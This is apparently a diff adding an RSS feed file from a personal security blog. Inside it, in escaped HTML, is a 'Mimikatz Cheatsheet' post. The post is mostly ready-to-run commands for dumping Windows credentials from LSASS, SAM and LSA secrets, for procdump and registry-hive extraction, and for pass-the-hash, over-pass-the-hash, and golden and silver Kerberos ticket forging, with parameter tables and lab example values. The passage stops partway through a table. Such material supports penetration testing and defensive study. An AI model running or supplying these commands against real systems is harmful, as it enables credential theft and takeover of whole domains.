@@ -1,0 +1,381 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Mimikatz | Giovanni Pecoraro</title><link>https://www.peco602.com/tag/mimikatz/</link><atom:link href="https://www.peco602.com/tag/mimikatz/index.xml" rel="self" type="application/rss+xml"/><description>Mimikatz</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Sun, 07 Aug 2022 00:00:00 +0000</lastBuildDate><image><url>https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png</url><title>Mimikatz</title><link>https://www.peco602.com/tag/mimikatz/</link></image><item><title>Mimikatz Cheatsheet</title><link>https://www.peco602.com/post/0030-mimikatz-cheatsheet/</link><pubDate>Sun, 07 Aug 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0030-mimikatz-cheatsheet/</guid><description>&lt;h2 id="basic-commands">Basic commands&lt;/h2>
+&lt;p>Dump credentials on a local machine (needs local administrator rights):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-DumpCreds&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;token::elevate&amp;#34; &amp;#34;sekurlsa::logonpasswords&amp;#34;&amp;#39;&lt;/span> &lt;span class="c"># Cached passwords&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::sam&amp;#34;&amp;#39;&lt;/span> &lt;span class="c"># SAM database passwords&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::secrets&amp;#34;&amp;#39;&lt;/span> &lt;span class="c"># LSA secrets&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::cache&amp;#34;&amp;#39;&lt;/span> &lt;span class="c"># Cached credentials&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # privilege::debug
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # token::elevate
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # sekurlsa::logonpasswords
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::sam
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::secrets
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::cache
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # vault::list
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # vault::cred
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # vault::cred /patch
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Dump credentials on multiple remote machines (needs administrator rights on remote machines):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-DumpCreds&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ERROR &lt;em>kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061&lt;/em>: The required privilege is not held by the client (mostly you&amp;rsquo;re not an administrator).&lt;/p>
+&lt;p>ERROR &lt;em>kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)&lt;/em>: No rights to access the LSASS process.&lt;/p>
+&lt;p>Extract in-memory credentials from a minidump of a local machine (needs local administrator rights):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: procdump.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: On the remote machine (needs local admin rights) &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.\procdump.exe -accepteula -ma lsass.exe c:\users\public\dump.dmp &lt;span class="mi">2&lt;/span>&lt;span class="p">&amp;gt;&amp;amp;&lt;/span>&lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: On the local machine after the reception of the minidump file dump.dmp&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # sekurlsa::minidump dump.dmp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # sekurlsa::logonpasswords
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Extract SAM credentials from a local machine without Mimikatz (needs local administrator rights):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: procdump.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: On the remote machine (needs local admin rights) &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg save hklm\system SYSTEM.sav
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg save hklm\sam SAM.sav
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg save hklm\security SECURITY.sav
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Invoke-Mimikatz -Command &amp;#39;&lt;span class="s2">&amp;#34;lsadump::sam /sam:SAM.sav /system:SYSTEM.sav&amp;#34;&lt;/span>&amp;#39;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Impacket&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># On a local kali machine&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">impacket-secretsdump -sam ./SAM -system ./SYSTEM -security ./SECURITY LOCAL
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Extract tickets relative to all users on a machine:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::tickets&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::tickets /export&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Inject the ticket of interest in the current user session:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt [0;82f8f7]-2-0-60a10000-dbprodadmin@krbtgt-US.FUNCORP.LOCAL.kirbi&amp;#34;&amp;#39;&lt;/span> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Execute mimikatz to get krbtgt hash (must be specified DC as ComputerName and requires Domain Admin privileges):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::lsa /patch&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: To be executed on domain controller&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::lsa /patch
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="pass-the-hash">Pass-the-Hash&lt;/h2>
+&lt;p>&amp;ldquo;Pass-the-Hash&amp;rdquo; inject a hash for a machine local administrator (needs local administrator rights). Once you get the NTLM hash of the RID 500 remote machine Administrator it is possible to inject it into a session:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::pth /domain:[COMPUTER_FQDN] /user:Administrator /ntlm:[NTLM_HASH] /run:powershell.exe&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::pth /domain:COMPUTER1.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # privilege::debug
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # token::elevate
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # sekurlsa::pth /domain:[COMPUTER_FQDN] /user:Administrator /ntlm:[NTLM_HASH] /run:powershell.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # sekurlsa::pth /domain:COMPUTER1.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>and the open a SYSTEM shell by &lt;code>psexec&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">psexec.exe \\COMPUTER1 cmd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="over-pass-the-hash">Over-Pass-the-Hash&lt;/h2>
+&lt;p>&amp;ldquo;Over-Pass-the-Hash&amp;rdquo; generate tokens from hashes (needs local administrator rights):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;token::elevate&amp;#34; &amp;#34;sekurlsa::pth /user:Administrator /domain:cyberlab.cybercorp.local /ntlm:[NTLM_HASH] /run:powershell.exe&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # privilege::debug
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # token::elevate
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # sekurlsa::pth /user:Administrator /domain:cyberlab.cybercorp.local /ntlm:[NTLM_HASH] /run:powershell.exe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="golden-ticket">Golden Ticket&lt;/h2>
+&lt;p>Generate a TGT encripted with krbtgt hash valid for every user:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /krbtgt:[KRBTGT_NTLM_HASH] /id:[USER_RID] /groups:[GROUP_RID] /startoffset:[MINUTES_START_AVAILABILITY] /endin:[MINUTES_STOP_AVAILABILITY] /renewmax:[MINUTES_LIFETIME_WITH_RENEWAL] /ptt&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /krbtgt:[KRBTGT_NTLM_HASH] /id:[USER_RID] /groups:[GROUP_RID] /startoffset:[MINUTES_START_AVAILABILITY] /endin:[MINUTES_STOP_AVAILABILITY] /renewmax:[MINUTES_LIFETIME_WITH_RENEWAL] /ptt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>Golden Ticket Parameters&lt;/strong>&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Parameter&lt;/th>
+&lt;th>Optional&lt;/th>
+&lt;th>Description&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>&lt;strong>/user&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>Username for which the TGT is generated&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/domain&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>Domain FQDN&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/sid&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>SID of the domain&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/krbtgt&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>NTLM (RC4) hash of the krbtgt account. Use &lt;strong>/aes128&lt;/strong> and &lt;strong>/aes256&lt;/strong> for using AES keys&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/sids&lt;/strong>&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>Additional SIDs for accounts/groups in the AD forest with rights you want the ticket to spoof. Typically, this will be the Enterprise Admins group for the root domain “S-1-5-21-[DOMAIN_ID]-519”. This parameter adds the provided SIDs to the SID History parameter.&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/id&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>User RID (default 500)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/groups&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>Group RID (default 513 512 520 518 519)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/startoffset&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>When the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/endin&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/renewmax&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>Ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/ptt&lt;/strong>&lt;/td>
+&lt;td>&lt;/td>
+&lt;td>Injects the ticket into the current PowerShell process (no need to save the ticket on disk)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/ticket&lt;/td>
+&lt;td>&lt;/td>
+&lt;td>Saves the ticket to a file for later use&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;p>&lt;strong>Golden Ticket Default Groups&lt;/strong>&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Group&lt;/th>
+&lt;th>SID&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Domain Users&lt;/td>
+&lt;td>S-1-5-21-[DOMAIN_ID]-513&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Domain Admins&lt;/td>
+&lt;td>S-1-5-21-[DOMAIN_ID]-512&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Schema Admins&lt;/td>
+&lt;td>S-1-5-21-[DOMAIN_ID]-518&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Enterprise Admins*&lt;/td>
+&lt;td>S-1-5-21-[DOMAIN_ID]-519&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Group Policy Creator Owners&lt;/td>
+&lt;td>S-1-5-21-[DOMAIN_ID]-520&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;p>*This is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /krbtgt:2e7a862b21d4afaeb8e0eb57a350b523 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /krbtgt:2e7a862b21d4afaeb8e0eb57a350b523 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Import a previously created ticket:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt ticket.kirbi&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::ptt ticket.kirbi
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="silver-ticket">Silver Ticket&lt;/h2>
+&lt;p>Generate a TGS encripted with a MACHINE$ account hash valid for its services:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /rc4:[TARGET_MACHINE_NTLM_HASH] /target:[TARGET_MACHINE_FQDN] /service:[TARGET_MACHINE_SERVICE] /ptt&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /rc4:[TARGET_MACHINE_NTLM_HASH] /target:[TARGET_MACHINE_FQDN] /service:[TARGET_MACHINE_SERVICE] /ptt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>Silver Ticket Parameters&lt;/strong>&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Parameter&lt;/th>
+&lt;th>Optional&lt;/th>
+&lt;th>Description&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>&lt;strong>/user&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>Username for which the TGT is generated&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/domain&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>Domain FQDN&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/sid&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>SID of the domain&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/rc4&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>NTLM (RC4) hash of the krbtgt account. Use &lt;strong>/aes128&lt;/strong> and &lt;strong>/aes256&lt;/strong> for using AES keys&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/target&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>Target server FQDN&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/service&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>Service Principal Name class of the Kerberos service running on target&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/id&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>User RID (default 500)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/groups&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>Group RID (default 513 512 520 518 519)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/startoffset&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>When the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/endin&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/renewmax&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>Ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/ptt&lt;/strong>&lt;/td>
+&lt;td>&lt;/td>
+&lt;td>Injects the ticket into the current PowerShell process (no need to save the ticket on disk)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/ticket&lt;/td>
+&lt;td>&lt;/td>
+&lt;td>Saves the ticket to a file for later use&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;p>&lt;strong>Silver Ticket Services&lt;/strong>&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Service Type&lt;/th>
+&lt;th>Required Silver Tickets Services&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>WMI&lt;/td>
+&lt;td>HOST, RPCSS&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>PowerShell Remoting&lt;/td>
+&lt;td>HOST, HTTP, WSMAN (only some OS), RPCSS (only some OS)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>WinRM&lt;/td>
+&lt;td>HOST, HTTP&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Scheduled Tasks&lt;/td>
+&lt;td>HOST&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Windows File Shares&lt;/td>
+&lt;td>CIFS&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>LDAP (Includes DCSync)&lt;/td>
+&lt;td>LDAP&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Windows Remote Server Administration Tools&lt;/td>
+&lt;td>RPCSS, LDAP, CIFS&lt;/td>
